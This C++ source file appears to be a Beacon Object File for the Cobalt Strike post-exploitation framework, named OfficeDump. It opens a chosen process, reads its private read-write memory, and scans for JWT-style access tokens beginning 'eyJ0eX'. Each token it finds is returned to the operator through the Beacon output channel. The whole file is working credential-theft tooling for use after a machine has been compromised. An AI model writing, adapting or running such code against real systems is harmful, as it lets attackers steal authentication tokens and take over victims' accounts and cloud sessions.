#include <general.h>

auto OfficeDump( ULONG ProcessId ) -> VOID {
    auto BeaconFmt     = fmt{ 0 };
    auto FormatSize    = INT32{ 0 };
    auto ProcessHandle = INVALID_HANDLE_VALUE;
    auto MmAddress     = PBYTE{ nullptr };
    auto MmInformation = MEMORY_BASIC_INFORMATION{ 0 };
    auto PageInterval  = SIZE_T{ 0 };
    auto BooleanStatus = BOOL{ FALSE };
    auto ReadBuffer    = PWCHAR{ nullptr };
    auto BytesRead     = SIZE_T{ 0 };
    
    auto Cleanup = [&]() -> VOID {
        if ( ReadBuffer ) {
            HeapFree( GetProcessHeap(), 0, ReadBuffer ); ReadBuffer = nullptr;
        }
        
        if ( ProcessHandle != INVALID_HANDLE_VALUE ) {
            CloseHandle( ProcessHandle ); ProcessHandle = INVALID_HANDLE_VALUE;
        }

        BeaconFormatFree( &BeaconFmt );
    };

    BeaconFormatAlloc( &BeaconFmt, 0x1000 );
    
    ProcessHandle = OpenProcess( 
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, ProcessId 
    );
    if ( ProcessHandle == INVALID_HANDLE_VALUE || ProcessHandle == nullptr ) {
        BeaconFormatPrintf( &BeaconFmt, "Failed to open process %d: %d", ProcessId, GetLastError() ); return;
    }
    
    BeaconFormatPrintf( &BeaconFmt, "Scanning process %d for tokens...\n", ProcessId );
    
    while ( TRUE ) {
        PageInterval = VirtualQueryEx( 
            ProcessHandle, MmAddress, &MmInformation, 
            sizeof( MEMORY_BASIC_INFORMATION ) 
        );
        if ( PageInterval == 0 ) {
            BeaconFormatPrintf( &BeaconFmt, "Memory scan completed\n" ); break;
        }
        
        MmAddress = static_cast<PBYTE>( MmInformation.BaseAddress ) + MmInformation.RegionSize;
        
        if ( MmInformation.State != MEM_COMMIT ) {
            continue;
        }
        
        if ( MmInformation.Protect != PAGE_READWRITE ) {
            continue;
        }
        
        if ( MmInformation.Type != MEM_PRIVATE ) {
            continue;
        }
        
        if ( MmInformation.RegionSize > 100 * 1024 * 1024 ) { // 100MB
            continue;
        }
        
        if ( ReadBuffer ) {
            free( ReadBuffer );
            ReadBuffer = nullptr;
        }
        
        ReadBuffer = static_cast<PWCHAR>( 
            malloc( MmInformation.RegionSize ) 
        );
        
        if ( !ReadBuffer ) {
            BeaconPrintf( CALLBACK_ERROR, "Failed to allocate memory buffer" );
            continue;
        }
        
        BooleanStatus = ReadProcessMemory( 
            ProcessHandle, MmInformation.BaseAddress, ReadBuffer, 
            MmInformation.RegionSize, &BytesRead 
        );
        
        if ( ! BooleanStatus || BytesRead == 0 ) {
            continue;
        }
        
        auto CharCount = ( BytesRead / sizeof( WCHAR ) );
        
        if ( CharCount < 6 ) {
            continue;
        }
        
        for ( SIZE_T i = 0; i < CharCount - 6; i++ ) {
            if ( ReadBuffer[i+0] == L'e' &&
                 ReadBuffer[i+1] == L'y' &&
                 ReadBuffer[i+2] == L'J' &&
                 ReadBuffer[i+3] == L'0' &&
                 ReadBuffer[i+4] == L'e' &&
                 ReadBuffer[i+5] == L'X' ) {
                
                auto TokenLength = 0;
                for ( SIZE_T j = i; j < CharCount; j++ ) {
                    auto c = ReadBuffer[j];
                    
                    if ( 
                        ( c >= L'A' && c <= L'Z') || 
                        ( c >= L'a' && c <= L'z') || 
                        ( c >= L'0' && c <= L'9') ||
                         c == L'-' || c == L'_' || c == L'.' 
                    ) {
                        TokenLength++;
                    } else { break; }
                }
                
                if ( TokenLength > 20 ) {
                    BeaconFormatPrintf( &BeaconFmt, "Token found: %.*S\n", static_cast<int>( TokenLength ), ReadBuffer + i );
                }
                i += TokenLength;
            }
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, BeaconFormatToString(&BeaconFmt, &FormatSize));
    
    return Cleanup();
}

EXTERN_C auto go( CHAR* Args, INT32 Argc ) -> VOID {
    datap Parser = { 0 };
    
    BeaconDataParse( &Parser, Args, Argc );
    ULONG ProcessId = BeaconDataInt( &Parser );
    
    if ( ProcessId == 0 ) {
        BeaconPrintf( CALLBACK_ERROR, "Invalid process ID" ); return;
    }
    
    return OfficeDump( ProcessId );
}